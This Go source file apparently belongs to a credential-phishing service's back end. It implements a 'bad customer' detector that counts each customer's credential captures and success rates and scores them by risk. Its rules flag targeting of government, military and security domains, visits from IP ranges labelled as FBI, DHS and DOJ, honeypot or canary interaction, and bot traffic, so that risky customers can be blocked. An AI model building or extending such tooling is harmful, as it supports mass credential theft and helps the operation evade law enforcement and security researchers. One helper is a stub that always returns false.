package monitoring

import (
	"crypto/sha256"
	"fmt"
	"net"
	"regexp"
	"strings"
	"sync"
	"time"

	"github.com/rs/zerolog"
)

// CustomerRisk levels for scoring bad customers
type RiskLevel int

const (
	RiskLow RiskLevel = iota
	RiskMedium
	RiskHigh
	RiskCritical
)

// CustomerActivity tracks customer behavior patterns
type CustomerActivity struct {
	Slug            string    `json:"slug"`
	UserID          string    `json:"user_id"`
	FirstSeen       time.Time `json:"first_seen"`
	LastActive      time.Time `json:"last_active"`
	TotalRequests   int64     `json:"total_requests"`
	CredCaptures    int64     `json:"cred_captures"`
	UniqueIPs       int       `json:"unique_ips"`
	SuccessRate     float64   `json:"success_rate"`
	RiskScore       int       `json:"risk_score"`
	RiskLevel       RiskLevel `json:"risk_level"`
	Flags           []string  `json:"flags"`
	GeoPatterns     []string  `json:"geo_patterns"`
	DomainTargets   []string  `json:"domain_targets"`
	BehaviorProfile string    `json:"behavior_profile"`
}

// BadCustomerDetector monitors customer activity for suspicious patterns
type BadCustomerDetector struct {
	mu         sync.RWMutex
	customers  map[string]*CustomerActivity
	riskRules  []RiskRule
	blockedIPs map[string]time.Time
	logger     zerolog.Logger
}

// RiskRule defines patterns that indicate bad customers
type RiskRule struct {
	Name        string
	Pattern     string
	RiskWeight  int
	Threshold   int
	Description string
	Enabled     bool
}

// NewBadCustomerDetector creates a new customer monitoring system
func NewBadCustomerDetector(logger zerolog.Logger) *BadCustomerDetector {
	detector := &BadCustomerDetector{
		customers:  make(map[string]*CustomerActivity),
		blockedIPs: make(map[string]time.Time),
		logger:     logger,
	}

	// Initialize risk detection rules
	detector.initializeRiskRules()

	return detector
}

// initializeRiskRules sets up patterns for detecting bad customers
func (bcd *BadCustomerDetector) initializeRiskRules() {
	bcd.riskRules = []RiskRule{
		{
			Name:        "gov_targeting",
			Pattern:     `\.gov|\.mil|government|defense|police|fbi|cia|nsa`,
			RiskWeight:  50,
			Threshold:   1,
			Description: "Targeting government or law enforcement domains",
			Enabled:     true,
		},
		{
			Name:        "infrastructure_targeting",
			Pattern:     `cloudflare|amazon|google|security|antivirus|firewall`,
			RiskWeight:  40,
			Threshold:   3,
			Description: "Targeting critical infrastructure or security companies",
			Enabled:     true,
		},
		{
			Name:        "high_volume_spray",
			Pattern:     "",
			RiskWeight:  30,
			Threshold:   1000, // 1000+ attempts in timeframe
			Description: "High volume credential spray attacks",
			Enabled:     true,
		},
		{
			Name:        "law_enforcement_ips",
			Pattern:     "",
			RiskWeight:  60,
			Threshold:   1,
			Description: "Known law enforcement IP ranges accessing URLs",
			Enabled:     true,
		},
		{
			Name:        "automation_signatures",
			Pattern:     `bot|crawler|automated|selenium|headless`,
			RiskWeight:  25,
			Threshold:   10,
			Description: "Automated tools or bot behavior detected",
			Enabled:     true,
		},
		{
			Name:        "honeypot_interaction",
			Pattern:     `honeypot|trap|canary|detection`,
			RiskWeight:  70,
			Threshold:   1,
			Description: "Interaction with honeypot or detection systems",
			Enabled:     true,
		},
		{
			Name:        "rapid_ip_cycling",
			Pattern:     "",
			RiskWeight:  35,
			Threshold:   50, // 50+ unique IPs per customer
			Description: "Rapid IP address cycling indicating evasion",
			Enabled:     true,
		},
	}
}

// TrackCustomerActivity records customer behavior for analysis
func (bcd *BadCustomerDetector) TrackCustomerActivity(slug, userID, targetDomain, sourceIP, userAgent string) {
	bcd.mu.Lock()
	defer bcd.mu.Unlock()

	// Get or create customer activity record
	customer, exists := bcd.customers[slug]
	if !exists {
		customer = &CustomerActivity{
			Slug:          slug,
			UserID:        userID,
			FirstSeen:     time.Now(),
			DomainTargets: make([]string, 0),
			GeoPatterns:   make([]string, 0),
			Flags:         make([]string, 0),
		}
		bcd.customers[slug] = customer
	}

	// Update activity metrics
	customer.LastActive = time.Now()
	customer.TotalRequests++

	// Track unique IPs
	if !bcd.containsIP(customer, sourceIP) {
		customer.UniqueIPs++
	}

	// Track domain targets
	if targetDomain != "" && !bcd.containsString(customer.DomainTargets, targetDomain) {
		customer.DomainTargets = append(customer.DomainTargets, targetDomain)
	}

	// Analyze for risk patterns
	bcd.analyzeCustomerRisk(customer, targetDomain, sourceIP, userAgent)

	// Log suspicious activity
	if customer.RiskLevel >= RiskHigh {
		bcd.logger.Warn().
			Str("slug", slug).
			Str("user_id", userID).
			Int("risk_score", customer.RiskScore).
			Str("risk_level", bcd.riskLevelString(customer.RiskLevel)).
			Strs("flags", customer.Flags).
			Msg("🚨 High-risk customer detected")
	}
}

// analyzeCustomerRisk evaluates customer behavior against risk rules
func (bcd *BadCustomerDetector) analyzeCustomerRisk(customer *CustomerActivity, targetDomain, sourceIP, userAgent string) {
	initialScore := customer.RiskScore

	for _, rule := range bcd.riskRules {
		if !rule.Enabled {
			continue
		}

		switch rule.Name {
		case "gov_targeting":
			if matched, _ := regexp.MatchString(rule.Pattern, strings.ToLower(targetDomain)); matched {
				customer.RiskScore += rule.RiskWeight
				bcd.addFlag(customer, "gov_targeting")
			}

		case "infrastructure_targeting":
			if matched, _ := regexp.MatchString(rule.Pattern, strings.ToLower(targetDomain)); matched {
				customer.RiskScore += rule.RiskWeight
				bcd.addFlag(customer, "infrastructure_targeting")
			}

		case "high_volume_spray":
			if customer.TotalRequests > int64(rule.Threshold) {
				// Check if high volume in short time
				if time.Since(customer.FirstSeen) < 24*time.Hour {
					customer.RiskScore += rule.RiskWeight
					bcd.addFlag(customer, "volume_spray")
				}
			}

		case "law_enforcement_ips":
			if bcd.isLawEnforcementIP(sourceIP) {
				customer.RiskScore += rule.RiskWeight
				bcd.addFlag(customer, "law_enforcement")
			}

		case "automation_signatures":
			if matched, _ := regexp.MatchString(rule.Pattern, strings.ToLower(userAgent)); matched {
				customer.RiskScore += rule.RiskWeight
				bcd.addFlag(customer, "automation")
			}

		case "honeypot_interaction":
			if matched, _ := regexp.MatchString(rule.Pattern, strings.ToLower(targetDomain)); matched {
				customer.RiskScore += rule.RiskWeight
				bcd.addFlag(customer, "honeypot")
			}

		case "rapid_ip_cycling":
			if customer.UniqueIPs > rule.Threshold {
				customer.RiskScore += rule.RiskWeight
				bcd.addFlag(customer, "ip_cycling")
			}
		}
	}

	// Update risk level based on score
	customer.RiskLevel = bcd.calculateRiskLevel(customer.RiskScore)

	// Log risk changes
	if customer.RiskScore > initialScore {
		bcd.logger.Info().
			Str("slug", customer.Slug).
			Int("old_score", initialScore).
			Int("new_score", customer.RiskScore).
			Msg("📈 Customer risk score increased")
	}
}

// isLawEnforcementIP checks if IP belongs to known LE ranges
func (bcd *BadCustomerDetector) isLawEnforcementIP(ip string) bool {
	// Known LE IP ranges (simplified - expand based on intelligence)
	leRanges := []string{
		"192.52.178.0/24", // FBI
		"149.101.0.0/16",  // DHS
		"204.248.25.0/24", // DOJ
		// Add more ranges based on your intelligence
	}

	clientIP := net.ParseIP(ip)
	if clientIP == nil {
		return false
	}

	for _, cidr := range leRanges {
		_, ipNet, err := net.ParseCIDR(cidr)
		if err != nil {
			continue
		}
		if ipNet.Contains(clientIP) {
			return true
		}
	}

	return false
}

// GetCustomerRisk returns risk assessment for a customer
func (bcd *BadCustomerDetector) GetCustomerRisk(slug string) (*CustomerActivity, bool) {
	bcd.mu.RLock()
	defer bcd.mu.RUnlock()

	customer, exists := bcd.customers[slug]
	return customer, exists
}

// GetHighRiskCustomers returns customers above risk threshold
func (bcd *BadCustomerDetector) GetHighRiskCustomers() []*CustomerActivity {
	bcd.mu.RLock()
	defer bcd.mu.RUnlock()

	var risky []*CustomerActivity
	for _, customer := range bcd.customers {
		if customer.RiskLevel >= RiskHigh {
			risky = append(risky, customer)
		}
	}

	return risky
}

// ShouldBlockCustomer determines if customer should be blocked
func (bcd *BadCustomerDetector) ShouldBlockCustomer(slug string) bool {
	customer, exists := bcd.GetCustomerRisk(slug)
	if !exists {
		return false
	}

	// Block critical risk customers
	return customer.RiskLevel >= RiskCritical
}

// RecordCredentialCapture tracks successful credential captures
func (bcd *BadCustomerDetector) RecordCredentialCapture(slug string, success bool) {
	bcd.mu.Lock()
	defer bcd.mu.Unlock()

	customer, exists := bcd.customers[slug]
	if !exists {
		return
	}

	customer.CredCaptures++

	// Calculate success rate
	if customer.TotalRequests > 0 {
		customer.SuccessRate = float64(customer.CredCaptures) / float64(customer.TotalRequests)
	}

	// Suspicious patterns
	if customer.SuccessRate > 0.8 && customer.TotalRequests > 100 {
		customer.RiskScore += 20
		bcd.addFlag(customer, "high_success_rate")
	}
}

// Helper functions
func (bcd *BadCustomerDetector) containsIP(customer *CustomerActivity, ip string) bool {
	// Simplified - in production, maintain IP set per customer
	return false // Always count as new for this example
}

func (bcd *BadCustomerDetector) containsString(slice []string, item string) bool {
	for _, s := range slice {
		if s == item {
			return true
		}
	}
	return false
}

func (bcd *BadCustomerDetector) addFlag(customer *CustomerActivity, flag string) {
	if !bcd.containsString(customer.Flags, flag) {
		customer.Flags = append(customer.Flags, flag)
	}
}

func (bcd *BadCustomerDetector) calculateRiskLevel(score int) RiskLevel {
	switch {
	case score >= 100:
		return RiskCritical
	case score >= 60:
		return RiskHigh
	case score >= 30:
		return RiskMedium
	default:
		return RiskLow
	}
}

func (bcd *BadCustomerDetector) riskLevelString(level RiskLevel) string {
	switch level {
	case RiskCritical:
		return "CRITICAL"
	case RiskHigh:
		return "HIGH"
	case RiskMedium:
		return "MEDIUM"
	default:
		return "LOW"
	}
}

// GenerateReport creates customer risk assessment report
func (bcd *BadCustomerDetector) GenerateReport() map[string]interface{} {
	bcd.mu.RLock()
	defer bcd.mu.RUnlock()

	report := map[string]interface{}{
		"timestamp":       time.Now(),
		"total_customers": len(bcd.customers),
		"risk_distribution": map[string]int{
			"low":      0,
			"medium":   0,
			"high":     0,
			"critical": 0,
		},
		"top_risks": make([]*CustomerActivity, 0),
	}

	var topRisks []*CustomerActivity

	for _, customer := range bcd.customers {
		switch customer.RiskLevel {
		case RiskLow:
			report["risk_distribution"].(map[string]int)["low"]++
		case RiskMedium:
			report["risk_distribution"].(map[string]int)["medium"]++
		case RiskHigh:
			report["risk_distribution"].(map[string]int)["high"]++
		case RiskCritical:
			report["risk_distribution"].(map[string]int)["critical"]++
		}

		if customer.RiskLevel >= RiskHigh {
			topRisks = append(topRisks, customer)
		}
	}

	report["top_risks"] = topRisks
	return report
}

// HashUserID creates anonymous hash for user tracking
func (bcd *BadCustomerDetector) HashUserID(userID string) string {
	hash := sha256.Sum256([]byte(userID))
	return fmt.Sprintf("%x", hash)[:12]
}
